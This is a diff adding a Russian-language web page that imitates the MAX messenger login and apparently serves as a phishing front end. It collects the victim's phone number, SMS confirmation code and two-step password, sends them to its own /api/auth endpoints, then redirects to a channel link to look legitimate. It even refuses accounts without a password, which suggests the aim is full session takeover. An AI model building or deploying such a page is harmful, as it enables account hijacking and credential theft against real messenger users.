@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#17181c">
+<title>Вход в MAX</title>
+<style>
+:root{
+  --bg:#17181c;--surface:#1e2027;--surface-2:#262933;--surface-3:#2b2f3a;
+  --text:#fff;--muted:rgba(255,255,255,.58);--muted-2:rgba(255,255,255,.36);
+  --border:rgba(255,255,255,.09);--accent:#2f7cf6;--accent-hover:#3d88fb;
+  --danger:#e5484d;--radius:20px;--radius-sm:12px;
+}
+*,*::before,*::after{box-sizing:border-box}
+html,body{margin:0;padding:0}
+html{touch-action:manipulation;-webkit-text-size-adjust:100%}
+body{background:var(--bg);color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:16px;line-height:1.5;-webkit-font-smoothing:antialiased;min-height:100dvh}
+button,input,select{font:inherit;color:inherit}
+button{cursor:pointer}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+.screen{display:none;min-height:100dvh;padding:24px 20px 92px;
+  flex-direction:column;align-items:center;justify-content:center}
+.screen.is-active{display:flex}
+.screen--wide{padding:0;align-items:stretch;justify-content:flex-start}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  border:0;border-radius:var(--radius-sm);padding:14px 18px;
+  font-size:16px;font-weight:600;line-height:1.2;
+  transition:background .15s,color .15s,opacity .15s,transform .06s;
+  -webkit-tap-highlight-color:transparent}
+.btn:active{transform:scale(.985)}
+.btn--block{width:100%}
+.btn--big{padding:16px 20px;border-radius:14px}
+.btn--sm{padding:9px 16px;font-size:14px;border-radius:10px}
+.btn--primary{background:var(--accent);color:#fff}
+.btn--primary:hover{background:var(--accent-hover)}
+.btn--primary:disabled{opacity:.45;cursor:default;transform:none}
+.btn--ghost{background:var(--surface-2);color:#fff}
+.btn--link{background:transparent;color:var(--muted);font-weight:500}
+.btn--link:hover{color:#fff}
+.btn--link:disabled{color:var(--muted-2);cursor:default}
+.field{display:flex;flex-direction:column;gap:8px;margin-bottom:18px}
+.field__label{font-size:13px;font-weight:500;color:var(--muted);letter-spacing:.2px}
+.input{width:100%;background:var(--surface-2);border:1px solid var(--border);
+  border-radius:var(--radius-sm);padding:14px 16px;font-size:16px;color:#fff;
+  outline:none;transition:border-color .15s,background .15s}
+.input:focus{border-color:var(--accent);background:var(--surface-3)}
+.input::placeholder{color:var(--muted-2)}
+.phone{display:flex;align-items:stretch;background:var(--surface-2);
+  border:1px solid var(--border);border-radius:var(--radius-sm);
+  overflow:hidden;transition:border-color .15s,background .15s}
+.phone:focus-within{border-color:var(--accent);background:var(--surface-3)}
+.phone__country{appearance:none;-webkit-appearance:none;background:transparent;
+  border:0;border-right:1px solid var(--border);padding:14px 34px 14px 14px;
+  font-size:16px;color:#fff;white-space:nowrap;cursor:pointer;outline:none;
+  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'><path d='M1 1l4 4 4-4' stroke='%23ffffff88' stroke-width='1.6' fill='none' stroke-linecap='round' stroke-linejoin='round'/></svg>");
+  background-repeat:no-repeat;background-position:right 12px center}
+.phone__country option{background:#1e2027;color:#fff}
+.phone__input{flex:1;min-width:0;background:transparent;border:0;outline:none;
+  padding:14px;font-size:16px;color:#fff;letter-spacing:.4px}
+.phone__input::placeholder{color:var(--muted-2);letter-spacing:normal}
+.input-wrap{position:relative}
+.input-wrap .input{padding-right:50px}
+.input-wrap__toggle{position:absolute;right:6px;top:50%;transform:translateY(-50%);
+  display:flex;align-items:center;justify-content:center;width:38px;height:38px;
+  background:transparent;border:0;border-radius:10px;color:var(--muted);
+  transition:color .15s,background .15s}
+.input-wrap__toggle:hover{color:#fff;background:rgba(255,255,255,.06)}
+.input-wrap__toggle .icon-eye-off{display:none}
+.input-wrap__toggle.is-visible .icon-eye{display:none}
+.input-wrap__toggle.is-visible .icon-eye-off{display:block}
+.code{display:flex;gap:8px;margin-bottom:18px}
+.code__input{flex:1;min-width:0;height:58px;background:var(--surface-2);
+  border:1px solid var(--border);border-radius:var(--radius-sm);
+  text-align:center;font-size:22px;font-weight:600;color:#fff;outline:none;
+  caret-color:var(--accent);transition:border-color .15s,background .15s}
+.code__input:focus{border-color:var(--accent);background:var(--surface-3)}
+.code__input.is-filled{border-color:rgba(47,124,246,.55)}
+.auth{width:100%;max-width:400px;background:var(--surface);
+  border:1px solid var(--border);border-radius:var(--radius);padding:28px 22px 24px}
+.auth__top{display:flex;align-items:center;margin-bottom:18px}
+.auth__back{display:flex;align-items:center;justify-content:center;width:38px;height:38px;
+  margin-left:-8px;background:transparent;border:0;border-radius:10px;color:var(--muted);
+  transition:color .15s,background .15s}
+.auth__back:hover{color:#fff;background:rgba(255,255,255,.06)}
+.auth__title{font-size:24px;font-weight:700;letter-spacing:-.4px;margin:0 0 8px}
+.auth__subtitle{font-size:14px;color:var(--muted);margin:0 0 24px;line-height:1.45}
+.auth__subtitle b{color:#fff;font-weight:600;white-space:nowrap}
+.auth__note{font-size:12px;color:var(--muted-2);text-align:center;
+  margin:16px 0 0;line-height:1.5}
+.auth__note a{color:var(--muted);text-decoration:underline;text-underline-offset:2px}
+.auth__note a:hover{color:#fff}
+.auth__resend{text-align:center;margin:2px 0 18px}
+.auth__error{display:none;margin-top:14px;padding:12px 14px;
+  background:rgba(229,72,77,.12);border:1px solid rgba(229,72,77,.4);
+  border-radius:12px;color:#ff9ea0;font-size:14px;line-height:1.45}
+.auth__error.is-visible{display:block}
+.spinner{display:inline-block;width:16px;height:16px;
+  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
+  border-radius:50%;animation:spin .7s linear infinite;margin-right:8px;vertical-align:middle}
+@keyframes spin{to{transform:rotate(360deg)}}
+.podpiska{min-height:100dvh;display:flex;flex-direction:column;background:var(--bg)}
+.podpiska__header{width:100%;max-width:760px;margin:0 auto;display:flex;
+  align-items:center;justify-content:space-between;gap:12px;padding:14px 16px}
+.logo{display:flex;align-items:center;gap:10px}
+.logo__mark{width:38px;height:38px;border-radius:50%;
+  background:conic-gradient(from 90deg,#06affb,#001cf1,#8900ac,#06affb);
+  display:grid;place-items:center;font-size:16px;font-weight:800;color:#fff;
+  box-shadow:inset 0 1px 6px rgba(255,255,255,.35);flex:0 0 auto}
+.logo__text{font-size:20px;font-weight:800;letter-spacing:-.6px}
+.podpiska__content{flex:1;display:flex;align-items:center;justify-content:center;
+  padding:16px 16px 40px}
+.podpiska__card{width:100%;max-width:440px;background:var(--surface);
+  border:1px solid var(--border);border-radius:var(--radius);
+  padding:26px 20px 22px;text-align:center}
+.podpiska__avatar{width:96px;height:96px;margin:0 auto 16px;border-radius:50%;
+  overflow:hidden;background:var(--surface-2);border:2px solid rgba(255,255,255,.08)}
+.podpiska__avatar img{width:100%;height:100%;object-fit:cover}
+.podpiska__title{font-size:22px;font-weight:700;letter-spacing:-.4px;margin:0 0 4px;word-break:break-word}
+.podpiska__username{font-size:14px;color:var(--muted);margin-bottom:16px;word-break:break-all}
+.podpiska__desc{font-size:15px;color:rgba(255,255,255,.72);line-height:1.5;margin:0 0 24px}
+.podpiska__actions{display:flex;flex-direction:column;gap:10px}
+.podpiska__notice{font-size:12px;color:var(--muted-2);margin:16px 0 0;line-height:1.5}
+@media (max-width:380px){
+  .auth{padding:24px 18px 20px}
+  .auth__title{font-size:22px}
+  .code{gap:6px}
+  .code__input{height:52px;font-size:20px}
+  .phone__country{padding:14px 30px 14px 12px;font-size:15px}
+}
+</style>
+</head>
+<body>
+
+<!-- ЭКРАН 1. ТЕЛЕФОН -->
+<section class="screen is-active" id="screen-phone">
+  <div class="auth">
+    <h1 class="auth__title">Вход</h1>
+    <p class="auth__subtitle">Введите номер телефона — мы отправим код подтверждения</p>
+    <form class="auth__form" onsubmit="return false">
+      <div class="field">
+        <label class="field__label" for="phone">Номер телефона</label>
+        <div class="phone">
+          <select class="phone__country" id="country" aria-label="Страна">
+            <option value="+7" selected>🇷🇺 +7</option>
+            <option value="+375">🇧🇾 +375</option>
+            <option value="+994">🇦🇿 +994</option>
+            <option value="+374">🇦🇲 +374</option>
+            <option value="+995">🇬🇪 +995</option>
+            <option value="+996">🇰🇬 +996</option>
+            <option value="+373">🇲🇩 +373</option>
+            <option value="+992">🇹🇯 +992</option>
+            <option value="+998">🇺🇿 +998</option>
+            <option value="+993">🇹🇲 +993</option>
+          </select>
+          <input class="phone__input" id="phone" type="tel" inputmode="numeric"
+                 autocomplete="tel" placeholder="123 456 78 90">
+        </div>
+      </div>
+      <button class="btn btn--primary btn--block" type="submit" id="phoneSubmit" disabled>
+        Получить код
+      </button>
+      <div class="auth__error" id="phoneError"></div>
+    </form>
+    <p class="auth__note">
+      Продолжая, вы соглашаетесь с <a href="#">условиями использования</a><br>
+      и <a href="#">политикой конфиденциальности</a>
+    </p>
+  </div>
+</section>
+
+<!-- ЭКРАН 2. КОД -->
+<section class="screen" id="screen-code">
+  <div class="auth">
+    <div class="auth__top">
+      <button class="auth__back" type="button" data-goto="screen-phone" aria-label="Назад">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+             stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 18l-6-6 6-6"/>
+        </svg>
+      </button>
+    </div>
+    <h1 class="auth__title">Введите код</h1>
+    <p class="auth__subtitle">Мы отправили код на номер <b id="phoneShown">+7 —</b></p>
+    <form onsubmit="return false">
+      <div class="code" id="code">
+        <input class="code__input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Цифра 1">
+        <input class="code__input" type="text" inputmode="numeric" maxlength="1" aria-label="Цифра 2">
+        <input class="code__input" type="text" inputmode="numeric" maxlength="1" aria-label="Цифра 3">
+        <input class="code__input" type="text" inputmode="numeric" maxlength="1" aria-label="Цифра 4">
+        <input class="code__input" type="text" inputmode="numeric" maxlength="1" aria-label="Цифра 5">
+        <input class="code__input" type="text" inputmode="numeric" maxlength="1" aria-label="Цифра 6">
+      </div>
+      <div class="auth__resend">
+        <button class="btn btn--link" type="button" id="resendBtn" disabled>Отправить код повторно</button>
+      </div>
+      <button class="btn btn--primary btn--block" type="submit" id="codeSubmit">Подтвердить</button>
+      <div class="auth__error" id="codeError"></div>
+    </form>
+  </div>
+</section>
+
+<!-- ЭКРАН 3. ПАРОЛЬ -->
+<section class="screen" id="screen-password">
+  <div class="auth">
+    <div class="auth__top">
+      <button class="auth__back" type="button" data-goto="screen-code" aria-label="Назад">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+             stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 18l-6-6 6-6"/>
+        </svg>
+      </button>
+    </div>
+    <h1 class="auth__title">Введите пароль</h1>
+    <p class="auth__subtitle">У вашего аккаунта включена двухэтапная аутентификация</p>
+    <form onsubmit="return false">
+      <div class="field">
+        <label class="field__label" for="password">Пароль</label>
+        <div class="input-wrap">
+          <input class="input" id="password" type="password" autocomplete="current-password"
+                 placeholder="••••••••">
+          <button class="input-wrap__toggle" type="button"
+                  data-toggle-password="password" aria-label="Показать пароль">
+            <svg class="icon-eye" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg class="icon-eye-off" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M3 3l18 18"/>
+              <path d="M10.6 5.2A10.9 10.9 0 0 1 12 5c6.4 0 10 7 10 7a17.6 17.6 0 0 1-3.2 4.2"/>
+              <path d="M6.6 6.7A17.7 17.7 0 0 0 2 12s3.6 7 10 7a10.7 10.7 0 0 0 4.4-.9"/>
+              <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+      <button class="btn btn--primary btn--block" type="submit" id="passwordSubmit">Войти</button>
+      <div class="auth__error" id="passwordError"></div>
+    </form>
+    <p class="auth__note"><a href="#">Забыли пароль?</a></p>
+  </div>
+</section>
+
+<!-- ЭКРАН 4. ПАРОЛЬ НЕ УСТАНОВЛЕН -->
+<section class="screen" id="screen-no-password">
+  <div class="auth">
+    <h1 class="auth__title">Пароль не установлен</h1>
+    <p class="auth__subtitle">
+      На вашем аккаунте MAX не включена двухэтапная аутентификация.
+      По правилам компании вход разрешён только с паролем.
+    </p>
+    <p class="auth__subtitle">
+      Пожалуйста, установите пароль в приложении MAX
+      (Настройки → Безопасность → Двухэтапная аутентификация)
+      и попробуйте снова.
+    </p>
+    <button class="btn btn--primary btn--block" type="button" id="noPasswordRetry">
+      Попробовать снова
+    </button>
+  </div>
+</section>
+
+<!-- ЭКРАН 5. КАНАЛ -->
+<section class="screen screen--wide" id="screen-channel">
+  <main class="podpiska">
+    <header class="podpiska__header">
+      <a class="logo" href="#">
+        <span class="logo__mark">M</span>
+        <span class="logo__text">MAX</span>
+      </a>
+      <a class="btn btn--primary btn--sm" href="#">Скачать приложение</a>
+    </header>
+    <div class="podpiska__content">
+      <div class="podpiska__card">
+        <div class="podpiska__avatar">
+          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='96' height='96'><rect width='96' height='96' fill='%23262933'/><text x='48' y='60' font-size='34' text-anchor='middle' fill='%23ffffff55' font-family='sans-serif'>?</text></svg>" alt="">
+        </div>
+        <h1 class="podpiska__title">Название канала</h1>
+        <div class="podpiska__username">@username</div>
+        <p class="podpiska__desc">
+          Вход выполнен. Сейчас перенаправим вас в канал компании…
+        </p>
+        <div class="podpiska__actions">
+          <button class="btn btn--primary btn--big" type="button" id="channelGo">
+            Перейти в канал
+          </button>
+        </div>
+        <p class="podpiska__notice">
+          Если перенаправление не сработало — нажмите кнопку выше
+        </p>
+      </div>
+    </div>
+  </main>
+</section>
+
+<script>
+(function () {
+  'use strict';
+
+  var REDIRECT_URL = 'https://max.ru/your-company-channel';
+  var MIN_CODE_LEN = 4;
+
+  var state = { phone: '', code: '', password: '' };
+
+  function $(id) { return document.getElementById(id); }
+
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(function (s) {
+      s.classList.toggle('is-active', s.id === id);
+    });
+    window.scrollTo(0, 0);
+  }
+
+  function showError(id, msg) {
+    var el = $(id);
+    if (!el) return;
+    el.textContent = msg;
+    el.classList.add('is-visible');
+  }
+
+  function hideError(id) {
+    var el = $(id);
+    if (el) el.classList.remove('is-visible');
+  }
+
+  function setLoading(btn, loading) {
+    if (!btn) return;
+    if (loading) {
+      btn.disabled = true;
+      btn.dataset.originalText = btn.textContent;
+      btn.innerHTML = '<span class="spinner"></span>' + btn.dataset.originalText;
+    } else {
+      btn.disabled = false;
+      btn.textContent = btn.dataset.originalText || btn.textContent;
+    }
+  }
+
+  async function postJSON(url, data) {
+    var res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    var json = null;
+    try { json = await res.json(); } catch (e) {}
+    return json || { ok: false, error: 'Сервер вернул некорректный ответ' };
+  }
+
+  function formatPhoneForDisplay(full) {
+    if (!full) return '+7 —';
+    var m = full.match(/^(\+\d{1,4})(\d+)$/);
+    if (!m) return full;
+    var cc = m[1], rest = m[2];
+    if (cc === '+7' && rest.length === 10) {
+      return cc + ' ' + rest.slice(0,3) + ' ' + rest.slice(3,6) + '-' + rest.slice(6,8) + '-' + rest.slice(8);
+    }
+    return cc + ' ' + rest;
+  }
+
+  /* ЭКРАН 1 */
+  (function () {
+    var input = $('phone'), country = $('country'), submit = $('phoneSubmit');
+    if (!input || !submit) return;
+    input.addEventListener('input', function () {
+      input.value = input.value.replace(/[^\d\s]/g, '').slice(0, 14);
+      submit.disabled = input.value.replace(/\D/g, '').length < 10;
+    });
+    submit.addEventListener('click', async function (e) {
+      e.preventDefault();
+      hideError('phoneError');
+      var cc = country.value;
+      var local = input.value.replace(/\D/g, '');
+      var full = cc + local;
+      state.phone = full;
+      $('phoneShown').textContent = formatPhoneForDisplay(full);
+      setLoading(submit, true);
+      try {
+        var r = await postJSON('/api/auth/send-code', { phone: full });
+        if (r.ok) {
+          showScreen('screen-code');
+          startResendTimer();
+          setTimeout(function () {
+            var first = document.querySelector('.code__input');
+            if (first) first.focus();
+          }, 100);
+        } else {
+          showError('phoneError', r.error || 'Не удалось отправить код');
+        }
+      } catch (err) {
+        showError('phoneError', 'Ошибка сети. Проверьте подключение.');
+      } finally {
+        setLoading(submit, false);
+      }
+    });
+  })();
+
+  /* ЭКРАН 2 */
+  (function () {
+    var inputs = Array.prototype.slice.call(document.querySelectorAll('.code__input'));
+    var submit = $('codeSubmit');
+    if (!inputs.length || !submit) return;
+    inputs.forEach(function (inp, i) {
+      inp.addEventListener('input', function () {
+        inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
+        inp.classList.toggle('is-filled', !!inp.value);
+        if (inp.value && i < inputs.length - 1) inputs[i + 1].focus();
+      });
+      inp.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !inp.value && i > 0) {
+          inputs[i - 1].value = '';
+          inputs[i - 1].classList.remove('is-filled');
+          inputs[i - 1].focus();
+        }
+        if (e.key === 'Enter') submit.click();
+      });
+      inp.addEventListener('paste', function (e) {
+        var text = ((e.clipboardData || window.clipboardData).getData('text') || '')
+          .replace(/\D/g, '');
+        if (!text) return;
+        e.preventDefault();
+        text.split('').slice(0, inputs.length - i).forEach(function (ch, k) {
+          var el = inputs[i + k];
+          el.value = ch;
+          el.classList.add('is-filled');
+        });
+        inputs[Math.min(i + text.length, inputs.length - 1)].focus();
+      });
+    });
+    function collectCode() {
+      return inputs.map(function (i) { return i.value; }).join('');
+    }
+    submit.addEventListener('click', async function (e) {
+      e.preventDefault();
+      hideError('codeError');
+      var code = collectCode();
+      if (code.length < MIN_CODE_LEN) {
+        showError('codeError', 'Введите код полностью');
+        return;
+      }
+      state.code = code;
+      setLoading(submit, true);
+      try {
+        var r = await postJSON('/api/auth/submit-code', { phone: state.phone, code: code });
+        if (!r.ok) { showError('codeError', r.error || 'Неверный код'); return; }
+        if (r.needs_password) {
+          showScreen('screen-password');
+          setTimeout(function () { var pw = $('password'); if (pw) pw.focus(); }, 100);
+        } else if (r.no_password) {
+          showScreen('screen-no-password');
+        } else if (r.redirect) {
+          goToChannel(r.redirect);
+        }
+      } catch (err) {
+        showError('codeError', 'Ошибка сети. Проверьте подключение.');
+      } finally {
+        setLoading(submit, false);
+      }
+    });
+  })();
+
+  /* ЭКРАН 3 */
+  (function () {
+    var submit = $('passwordSubmit'), input = $('password');
+    if (!submit || !input) return;
+    input.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') submit.click();
+    });
+    submit.addEventListener('click', async function (e) {
+      e.preventDefault();
+      hideError('passwordError');
+      var pw = input.value;
+      if (!pw) { showError('passwordError', 'Введите пароль'); return; }
+      state.password = pw;
+      setLoading(submit, true);
+      try {
+        var r = await postJSON('/api/auth/submit-password', { phone: state.phone, password: pw });
+        if (r.ok) goToChannel(r.redirect || REDIRECT_URL);
+        else showError('passwordError', r.error || 'Неверный пароль');
+      } catch (err) {
+        showError('passwordError', 'Ошибка сети. Проверьте подключение.');
+      } finally {
+        setLoading(submit, false);
+      }
+    });
+  })();
+
+  /* ЭКРАН 4 */
+  (function () {
+    var btn = $('noPasswordRetry');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      state = { phone: '', code: '', password: '' };
+      var phoneInput = $('phone');
+      if (phoneInput) phoneInput.value = '';
+      var phoneSubmit = $('phoneSubmit');
+      if (phoneSubmit) phoneSubmit.disabled = true;
+      document.querySelectorAll('.code__input').forEach(function (i) {
+        i.value = '';
+        i.classList.remove('is-filled');
+      });
+      var pwInput = $('password');
+      if (pwInput) pwInput.value = '';
+      showScreen('screen-phone');
+    });
+  })();
+
+  function goToChannel(url) {
+    showScreen('screen-channel');
+    var btn = $('channelGo');
+    if (btn) btn.onclick = function () { window.location.href = url; };
+    setTimeout(function () { window.location.href = url; }, 2000);
+  }
+
+  document.querySelectorAll('[data-goto]').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      ['phoneError', 'codeError', 'passwordError'].forEach(hideError);
+      showScreen(btn.dataset.goto);
+    });
+  });
+
+  document.querySelectorAll('[data-toggle-password]').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var input = $(btn.dataset.togglePassword);
+      if (!input) return;
+      var show = input.type === 'password';
+      input.type = show ? 'text' : 'password';
+      btn.classList.toggle('is-visible', show);
+      btn.setAttribute('aria-label', show ? 'Скрыть пароль' : 'Показать пароль');
+    });
+  });
+
+  var resendTimerId = null;
+  function startResendTimer() {
+    var resend = $('resendBtn');
+    if (!resend) return;
+    if (resendTimerId) clearInterval(resendTimerId);
+    var sec = 59;
+    resend.disabled = true;
+    resend.textContent = 'Отправить код повторно через 0:' + String(sec).padStart(2, '0');
+    resendTimerId = setInterval(function () {
+      sec--;
+      if (sec <= 0) {
+        clearInterval(resendTimerId);
+        resendTimerId = null;
+        resend.disabled = false;
+        resend.textContent = 'Отправить код повторно';
+        return;
+      }
+      resend.textContent = 'Отправить код повторно через 0:' + String(sec).padStart(2, '0');
+    }, 1000);
+  }
+
+  (function () {
+    var resend = $('resendBtn');
+    if (!resend) return;
+    resend.addEventListener('click', async function () {
+      if (!state.phone) return;
+      resend.disabled = true;
+      hideError('codeError');
+      try {
+        var r = await postJSON('/api/auth/send-code', { phone: state.phone });
+        if (!r.ok) {
+          showError('codeError', r.error || 'Не удалось отправить код повторно');
+          resend.disabled = false;
+        } else {
+          startResendTimer();
+        }
+      } catch (err) {
+        showError('codeError', 'Ошибка сети');
+        resend.disabled = false;
+      }
+    });
+  })();
+
+})();
+</script>
+</body>
+</html>
